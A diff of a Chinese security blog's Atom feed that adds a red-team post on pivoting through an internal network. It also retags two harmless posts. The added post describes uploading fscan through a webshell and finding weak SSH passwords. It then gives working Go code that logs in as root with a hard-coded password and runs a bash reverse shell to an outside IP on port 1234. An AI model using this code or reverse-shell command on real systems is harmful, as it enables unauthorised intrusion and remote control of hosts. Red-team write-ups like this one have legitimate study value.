@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-05-07T13:33:37.335Z</updated>
+  <updated>2024-05-07T13:49:57.691Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,11 +17,35 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>自动化连接ssh并反弹shell</title>
+    <link href="http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/"/>
+    <id>http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/</id>
+    <published>2024-05-07T13:35:51.000Z</published>
+    <updated>2024-05-07T13:49:57.691Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x01-应用场景"><a href="#0x01-应用场景" class="headerlink" title="0x01 应用场景"></a>0x01 应用场景</h1><p>一个命令执行的口子</p><p>主机不出网</p><p>当前是nobody权限，web目录是root权限，写webshell没权限</p><p>通过一个ctf技巧搞了一个webshell，能上传文件但是不能执行命令</p><p>通过webshell将fscan上传到/tmp目录下，通过入口的命令执行漏洞执行fscan，发现内网有ssh弱口令</p><h1 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h1><p>已知连接ssh的同时可以执行命令<br><img src="/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/image-20230731085919496.png" alt="image"><br>当时的想法是连接ssh，然后执行命令反弹shell，但是连接ssh需要交互式shell，第一时间想到expect，经测试主机上没有expect，然后想到通过python中的pexpect去做这件事，发现目标中的python缺少依赖，如果上传python依赖到对应的依赖库目录太麻烦了，最后想到用go去实现，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line"></span><br><span class="line">&quot;golang.org/x/crypto/ssh&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">username = &quot;root&quot;</span><br><span class="line">password = &quot;P@ssw0rd!&quot;</span><br><span class="line">addr     = &quot;10.62.139.19:22&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">config := &amp;ssh.ClientConfig &#123;</span><br><span class="line">User: username,</span><br><span class="line">Auth: []ssh.AuthMethod&#123;</span><br><span class="line">ssh.Password(password),</span><br><span class="line">&#125;,</span><br><span class="line">HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client, err := ssh.Dial(&quot;tcp&quot;, addr, config)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to dial: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer client.Close()</span><br><span class="line"></span><br><span class="line">// 开启一个session，用于执行一个命令</span><br><span class="line">session, err := client.NewSession()</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to create session: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer session.Close()</span><br><span class="line"></span><br><span class="line">// 执行命令，并将执行的结果写到 b 中</span><br><span class="line">var b bytes.Buffer</span><br><span class="line">session.Stdout = &amp;b</span><br><span class="line"></span><br><span class="line">// 也可以使用 session.CombinedOutput() 整合输出</span><br><span class="line">if err := session.Run(&quot;bash -i &gt;&amp; /dev/tcp/123.249.104.83/1234 0&gt;&amp;1&quot;); err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to run: &quot; + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(b.String())  // root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实是在赌目标主机出网，盲打成功接收到反弹shell那一刻，还是挺爽的~</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;0x01-应用场景&quot;&gt;&lt;a href=&quot;#0x01-应用场景&quot; class=&quot;headerlink&quot; title=&quot;0x01 应用场景&quot;&gt;&lt;/a&gt;0x01 应用场景&lt;/h1&gt;&lt;p&gt;一个命令执行的口子&lt;/p&gt;
+&lt;p&gt;主机不出网&lt;/p&gt;
+&lt;p&gt;当前是nobody权限，</summary>
+      
+    
+    
+    
+    
+    <category term="攻防对抗" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
+    
+  </entry>
+  
+  <entry>
     <title>小程序-多用户微博系统</title>
     <link href="http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/"/>
     <id>http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/</id>
     <published>2024-05-07T13:30:01.000Z</published>
-    <updated>2024-05-07T13:33:37.335Z</updated>
+    <updated>2024-05-07T13:38:39.738Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>之前有段时间在搞小程序开发，搞来搞去最终放弃了，不过收获还是蛮多的，记得刚入行安全时，一直想学开发，总觉得不懂开发就搞不好安全，现在也算圆了这个执念，学习开发对安全是有帮助的，不过现在想对那时的自己说一句，不用专门学开发也可以把安全搞得好</p><h1 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h1><p>一个简易的多用户微博系统，每个人都可以在上面留言，欢迎大家留言，地址：<a href="https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/">https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/</a></p><p>截图如下：<br><img src="/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/01.jpg" alt="image"></p>]]></content>
     
@@ -34,7 +58,7 @@
     
     
     
-    <category term="程序开发" scheme="http://example.com/tags/%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/"/>
+    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
     
   </entry>
   
@@ -43,7 +67,7 @@
     <link href="http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
     <id>http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/</id>
     <published>2024-05-07T13:25:18.000Z</published>
-    <updated>2024-05-07T13:27:21.277Z</updated>
+    <updated>2024-05-07T13:38:54.132Z</updated>
     
     <content type="html"><![CDATA[<p>程序流程如下<br><img src="/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/01.png" alt="image"></p><p>之前做红队时自己开发的工具，代码完全开源到GitHub，地址：<a href="https://github.com/ybdt/RuiningGather-Python">https://github.com/ybdt/RuiningGather-Python</a></p>]]></content>
     
@@ -56,7 +80,7 @@
     
     
     
-    <category term="工具开发" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
+    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
     
   </entry>
   
